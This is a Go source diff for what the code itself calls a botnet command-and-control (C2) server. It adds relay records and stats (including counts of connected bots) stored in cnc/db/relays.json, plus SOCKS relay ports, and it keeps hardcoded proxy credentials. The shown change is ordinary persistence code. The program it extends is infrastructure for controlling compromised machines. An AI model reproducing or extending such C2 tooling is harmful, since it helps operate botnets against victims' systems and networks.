@@ -7,6 +7,7 @@ import (
 	"net"
 	"net/http"
 	"os"
+	"strings"
 	"sync"
 	"time"
 )
@@ -45,12 +46,80 @@ const (
 	PROTOCOL_VERSION = "v5.9"
 )
 
-// bakedRelayEndpoints holds relay addresses patched in by setup.py.
-// Format: "host:controlPort:socksPort" separated by commas.
-// Empty string means no pre-configured relays.
-var bakedRelayEndpoints = "" // change me run setup.py
-var bakedProxyUser = "sRqn2362NNHJ"                            // change me run setup.py
-var bakedProxyPass = "hGNuLxxASMxC"                            // change me run setup.py
+var bakedProxyUser = "sRqn2362NNHJ" // change me run setup.py
+var bakedProxyPass = "hGNuLxxASMxC" // change me run setup.py
+
+// RelayEntry represents a relay in relays.json.
+type RelayEntry struct {
+	ID          string    `json:"id"`
+	Name        string    `json:"name"`
+	Host        string    `json:"host"`
+	ControlPort string    `json:"controlPort"`
+	SocksPort   string    `json:"socksPort"`
+	AddedAt     time.Time `json:"addedAt"`
+}
+
+// RelayStats holds the most-recently-reported stats from a relay.
+type RelayStats struct {
+	Name           string    `json:"name"`
+	ActiveConns    int64     `json:"activeConns"`
+	TotalSessions  int64     `json:"totalSessions"`
+	BytesUp        int64     `json:"bytesUp"`
+	BytesDown      int64     `json:"bytesDown"`
+	FailedSessions int64     `json:"failedSessions"`
+	ConnectedBots  int64     `json:"connectedBots"`
+	UptimeSecs     int64     `json:"uptimeSecs"`
+	LastSeen       time.Time `json:"lastSeen"`
+	Up             bool      `json:"up"`
+}
+
+var (
+	relaysMu        sync.RWMutex
+	relaysCache     []RelayEntry
+	relayStatsMu    sync.RWMutex
+	relayStatsCache = map[string]RelayStats{}
+)
+
+// dbPath returns the path to a file inside the cnc/db directory,
+// resolving relative to whichever working directory the binary runs from.
+func dbPath(name string) string {
+	for _, base := range []string{"cnc/db", "db"} {
+		p := base + "/" + name
+		if _, err := os.Stat(base); err == nil {
+			return p
+		}
+	}
+	return "db/" + name
+}
+
+// loadRelaysFromDisk reads cnc/db/relays.json into relaysCache.
+func loadRelaysFromDisk() {
+	path := dbPath("relays.json")
+	data, err := os.ReadFile(path)
+	if err != nil {
+		// File missing — start empty, will be created on first write
+		return
+	}
+	var entries []RelayEntry
+	if err := json.Unmarshal(data, &entries); err == nil {
+		relaysMu.Lock()
+		relaysCache = entries
+		relaysMu.Unlock()
+	}
+}
+
+// saveRelaysToDisk writes relaysCache to cnc/db/relays.json atomically.
+func saveRelaysToDisk() error {
+	relaysMu.RLock()
+	data, err := json.MarshalIndent(relaysCache, "", "  ")
+	relaysMu.RUnlock()
+	if err != nil {
+		return err
+	}
+	path := dbPath("relays.json")
+	os.MkdirAll(strings.TrimSuffix(path, "/relays.json"), 0755)
+	return os.WriteFile(path, data, 0644)
+}
 
 type BotConnection struct {
 	conn          net.Conn
@@ -127,6 +196,7 @@ var (
 
 func main() {
 	c2StartTime = time.Now()
+	loadRelaysFromDisk()
 
 	// Parse CLI flags
 	var runTUI, runWebTor, runSplit bool
